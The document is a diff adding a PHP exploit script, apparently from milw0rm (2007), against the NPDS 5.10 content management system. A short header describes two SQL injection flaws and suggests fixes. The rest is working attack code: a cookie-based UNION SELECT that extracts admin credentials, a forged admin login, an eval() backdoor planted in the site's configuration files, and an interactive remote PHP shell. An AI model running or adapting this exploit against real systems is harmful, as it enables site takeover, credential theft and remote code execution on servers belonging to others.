@@ -1,0 +1,192 @@
+<?php
+/*---------------------------------------------------------*\
+NPDS <= 5.10 - Remote Code Execution exploit
+
+[|Description:|]
+Security holes were found in NPDS 5.10.
+
+N°1: Sql Injection in cookies (File Mainfile.php lines 655 to 691).
+No check is carried out on nicknames or Id which can allow an attacker
+to modify a SQL request so as to obtain data.
+
+N°2: SQL Injection due to a bad use of "X_FORWARDED_FOR" (file Mainfile.php lines 88 to 110).
+NPDS uses the HTTP header "X_FORWARDED_FOR" which normally contains the IP adress
+of a person using a non anonymous proxy. This Ip address is used in a SQL resquest without appropriate
+filtering, and an attacker can define "X_FORWARDED_FOR" insering malicious SQL code.
+
+[|Advisory:|]
+http://www.aeroxteam.fr/advisory-NPDS-5.10.txt
+
+[|Solution:|]
+N°1: File mainfile.php, add after line 665:
+$cookie[0] = inval($cookie[0);
+$cookie[1] = addslashes($cookie[1]);
+$cookie[2] = addslashes($cookie[2]);
+
+N°2: Replace fonction "getip" (mainfile.php) by:
+function getip() {
+	return $_SERVER['REMOTE_ADDR'];
+}
+
+Gu1ll4um3r0m41n (aeroxteam --[at]-- gmail --[dot]-- com)
+for AeroX (AeroXteam.fr)
+(C)opyleft 2007
+Gr33tz: Darkfig, Spamm, Math², Barma, NeoMorphS, Snake91, Kad, Nitr0, BlastKiller, Alkino And everybody from #aerox@irc.epiknet.org
+\*---------------------------------------------------------*/
+if(count($argv) == 5) {
+	head();
+	echo "\r\n[+] Connection... ";
+	$sock = @fsockopen($argv[1], 80, $eno, $estr, 30);
+	if (!$sock) {
+		die("Failed\r\n\r\nCould not connect to ".$argv[1]." on the port 80 !");
+	}
+	########
+	
+	echo "OK\r\n";
+	echo "[+] Logging to account... ";
+	$reqlogin = "POST ".$argv[2]."user.php HTTP/1.1\r\n";
+	$reqlogin .= "Host: ".$argv[1]."\r\n";
+	$reqlogin .= "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\r\n";
+	$reqlogin .= "Accept: */*\r\n";
+	$reqlogin .= "Connection: close\r\n";
+	$reqlogin .= "Referer: http://".$argv[1]."".$argv[2]."user.php\r\n";
+	$reqlogin .= "Content-Type: application/x-www-form-urlencoded\r\n";
+	$reqlogin .= "Content-Length: ".strlen("uname=".$argv[3]."&pass=".$argv[4]."&op=login")."\r\n\r\n";
+	$reqlogin .= "uname=".$argv[3]."&pass=".$argv[4]."&op=login";
+	fwrite($sock, $reqlogin);
+	unset($reqlogin);
+	$pagelogin = '';
+	while(!feof($sock)) {
+		$pagelogin .= fgets($sock);
+	}
+	fclose($sock);
+	preg_match("`Set-Cookie: user=(.*?);`", $pagelogin, $cookie);
+	if(empty($cookie[1])) {
+		die("Failed\r\n\r\nCould not login as ".$argv[3]." !");
+	} else {
+		echo "OK\r\n";
+	}
+	
+	if(($decoded = base64_decode($cookie[1])) !== false) {
+		$exploded = explode(':', $decoded);
+		$exploded[0] = "' UNION SELECT CONCAT(0x4055534552, aid, 0x5553455240, 0x204050415353, pwd, 0x5041535340) FROM authors WHERE radminsuper=1 LIMIT 0,1 /*";
+		$exploded[8] = 1;
+		$cookieuser = base64_encode(implode(':', $exploded));
+	}
+	########
+	
+	echo "[+] Getting admin password... ";	
+	$sock = @fsockopen($argv[1], 80, $eno, $estr, 30);
+	if (!$sock) {
+		die("Failed\r\n\r\nCould not connect to ".$argv[1]." on the port 80 !");
+	}
+
+	$reqpass  = "GET ".$argv[2]."index.php?op=edito HTTP/1.1\r\n";
+	$reqpass .= "Host: ".$argv[1]."\r\n";
+	$reqpass .= "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\r\n";
+	$reqpass .= "Accept: */*\r\n";
+	$reqpass .= "Connection: close\r\n";
+	$reqpass .= "Cookie: user=".$cookieuser."; user_language=french\r\n\r\n";
+	fwrite($sock, $reqpass);
+	unset($reqpass);
+	$pagepass = '';
+	while(!feof($sock)) {
+		$pagepass .= fgets($sock);
+	}
+	fclose($sock);
+	preg_match("`@USER(.*?)USER@ @PASS(.*?)PASS@`", $pagepass, $result);
+	unset($pagepass);
+	
+	if(empty($result[1]) || empty($result[2])) {
+		fclose($sock);
+		die("Failed !\r\n\r\nMaybe not vulnerable ?!");
+	} else {
+		echo "OK\r\n";
+	}
+	########
+	
+	echo "[+] Login to admin & injecting PHP code... ";
+	$sock = @fsockopen($argv[1], 80, $eno, $estr, 30);
+	if (!$sock) {
+		die("Failed\r\n\r\nCould not connect to ".$argv[1]." on the port 80 !");
+	}
+	
+	$cookieadmin = base64_encode($result[1].':'.md5($result[2]));
+	
+	$reqshell  = "POST ".$argv[2]."admin.php?op=ConfigFiles_save HTTP/1.1\r\n";
+	$reqshell .= "Host: ".$argv[1]."\r\n";
+	$reqshell .= "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\r\n";
+	$reqshell .= "Accept: */*\r\n";
+	$reqshell .= "Connection: close\r\n";
+	$reqshell .= "Cookie: admin=".$cookieadmin."; user_language=french\r\n";
+	$reqshell .= "Referer: http://".$argv[1]."".$argv[2]."admin.php\r\n";
+	$reqshell .= "Content-Type: application/x-www-form-urlencoded\r\n";
+	$reqshell .= "Content-Length: ".strlen("Xtxt=".urlencode("<?php\r\n   include(\"modules/aide-contextuelle/AC-header.js\");\r\n   if(!empty(\$_SERVER['PHPSHELL'])){eval(\$_SERVER['PHPSHELL']);die();}\r\n?>")."&Xfiles=header_head&confirm=Sauver+les+modifications")."\r\n\r\n";
+	$reqshell .= "Xtxt=".urlencode("<?php\r\n   include_once(\"modules/ipban/ban.php\");\r\n   if(!empty(\$_SERVER['HTTP_PHPCODE'])){eval(urldecode(base64_decode(\$_SERVER['HTTP_PHPCODE'])));die();}\r\n?>")."&Xfiles=header_before&confirm=Sauver+les+modifications";
+	fwrite($sock, $reqshell);
+	unset($reqshell);
+	$pageshell = '';
+	while(!feof($sock)) {
+		$pageshell .= fgets($sock);
+	}
+	fclose($sock);
+	
+	if(preg_match('`location: admin\.php\?op=ConfigFiles`', $pageshell)) { $ok = 1; }
+	unset($pageshell);
+	
+	if(!$ok) {
+		die("Failed\r\n\r\nUnable to write PHP Code");
+	} else {
+		echo "OK\r\n\r\n";
+	}
+	
+	while(1) {
+		unset($exec);
+		echo "[PhpShell@".$argv[1]."]$ ";
+		$input = trim(fgets(STDIN));
+		if($input == 'quit' || $input == 'exit') {
+			break;
+		}
+		$sock = @fsockopen($argv[1], 80, $eno, $estr, 30);
+		if (!$sock) {
+			die("\r\nCould not connect to ".$argv[1]." on the port 80 !");
+		}
+		$req  = "GET ".$argv[2]."index.php?op=edito HTTP/1.1\r\n";
+		$req .= "Host: ".$argv[1]."\r\n";
+		$req .= "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\r\n";
+		$req .= "Accept: */*\r\n";
+		$req .= "PHPCODE: ".urldecode(base64_encode($input))."\r\n";
+		$req .= "Connection: close\r\n\r\n";
+		fwrite($sock, $req);
+		unset($req);
+		$headers = 0;
+		while(!feof($sock)) {
+			$buffer = fgets($sock);
+			if(!$headers) {
+				if($buffer == "\r\n") { $headers = 1; }
+			} else {
+				$exec .= $buffer;
+			}
+		}
+		echo $exec."\r\n\r\n";
+	}
+} else {
+	usage();
+}
+function usage() {
+	echo "+------------------------------------------------------+\r\n";
+	echo "|      NPDS <= 5.10 Remote Code Execution exploit      |\r\n";
+	echo "|             By Gu1ll4um3r0m41n for AeroX             |\r\n";
+	echo "|              You need a user account !!              |\r\n";
+	echo "|   Usage: php exploit.php site.com /path/ user pass   |\r\n";
+	echo "+------------------------------------------------------+\r\n";
+}
+function head() {
+	echo "+----------------------------------------------+\r\n";
+	echo "|  MPDS <= 5.10 Remote Code Execution exploit  |\r\n";
+	echo "|         By Gu1ll4um3r0m41n for AeroX         |\r\n";
+	echo "+----------------------------------------------+\r\n\r\n";
+}
+?>
+
+# milw0rm.com [2007-05-04]
